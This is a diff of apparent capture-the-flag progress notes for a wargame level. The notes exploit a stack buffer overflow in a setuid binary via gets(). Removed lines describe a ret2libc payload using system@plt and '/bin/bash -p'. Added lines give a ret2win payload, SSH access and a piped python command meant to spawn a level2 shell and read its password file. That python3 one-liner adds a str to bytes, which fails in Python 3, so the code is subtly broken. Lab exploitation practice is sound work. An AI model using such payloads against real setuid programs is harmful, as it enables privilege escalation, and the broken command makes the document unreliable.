@@ -1,54 +1,53 @@
-EXPLOIT_DEVELOPMENT_IN_PROGRESS
+READY_TO_TEST
 
-Vulnerability Analysis:
-=======================
-- Binary: /home/user/level1/level1 (32-bit ELF, setuid level2)
-- Type: Stack buffer overflow via gets()
-- Vulnerability: No bounds checking on 64-byte buffer
-- Mitigation bypass: ASLR disabled, NX disabled → Ret2libc viable
+Vulnerability: Buffer Overflow via gets()
+Solution: Jump to hidden run() function
+==========================================
 
-Key Addresses Identified:
-=========================
-- Buffer address: 0xbffffcb0 (from ltrace)
-- system@plt: 0x08048360 (from objdump)
-- exit libc: 0xb7e5ebe0 (from analysis)
-- /bin/bash -p: Embedded in overflow buffer
-
-Exploit Structure:
-==================
-Payload Size: 80 bytes
-[12] /bin/bash -p\x00 (command string)
-[52] Padding (X's)
-[4]  BBBB (filler)
-[4]  0x08048360 (system@plt - return address override)
-[4]  0xb7e5ebe0 (exit address - return from system)
-[4]  0xbffffcb0 (buffer address - argument to system)
-
-Solution: /bin/bash -p Flag
-============================
-Why /bin/bash -p?
-- /bin/sh automatically drops setuid for security
-- /bin/bash -p preserves setuid privileges when called
-- Allows spawned shell to run with level2 privileges
-- Can read /home/user/level2/.pass
-
-Testing Status:
-===============
-✓ Binary extracted from VM
-✓ Payload generated correctly
-✓ Buffer address verified with ltrace
-✓ PLT addresses confirmed with objdump
-✓ Payload syntax verified
-
-Next Steps to Complete:
-======================
-1. Test payload locally or verify on VM
-2. Read /home/user/level2/.pass with elevated privileges
-3. Update /home/jegoh/Documents/repo/rainfall/level1/flag with password
-
-Exploit Files:
+Key Discovery:
 ==============
-- exploit.py - Main exploit generator (updated with correct PLT addresses)
-- test_exploit.sh - Testing script for remote VM
-- analysis.txt - Detailed binary analysis
-- walkthrough - Step-by-step instructions
+The binary contains a HIDDEN run() function at 0x08048444 that:
+1. Prints "Good... Wait what?\n"
+2. Calls system("/bin/sh") with proper setuid privileges
+
+This was the intended solution, NOT complex ret2libc!
+
+Exploit Method:
+===============
+1. Overflow 64-byte buffer with gets()
+2. Overwrite return address with 0x08048444 (run function)
+3. When main() returns, it jumps to run()
+4. run() spawns shell as level2
+
+Payload Structure (80 bytes):
+==============================
+[76 bytes] Padding ('A' * 76)
+[4 bytes]  Return address: 0x08048444 (little-endian: \x44\x84\x04\x08)
+
+Commands to Execute on VM:
+===========================
+ssh level1@<VM_IP> -p 4242
+
+(python3 << 'EOF'
+import struct
+print("A" * 76 + struct.pack("<I", 0x08048444), end='')
+EOF
+cat) | ./level1
+
+Expected Output:
+================
+Good... Wait what?
+$ cat /home/user/level2/.pass
+$ [PASSWORD WILL BE HERE]
+
+Status:
+=======
+✓ Hidden run() function discovered at 0x08048444
+✓ Exploit payload created (Resources/exploit.py)
+✓ Payload verified (76 bytes padding + return address)
+✓ Walkthrough documentation updated
+⏳ Awaiting VM test to retrieve level2 password
+
+Next Step:
+==========
+Test on VM and update this file with the password from /home/user/level2/.pass
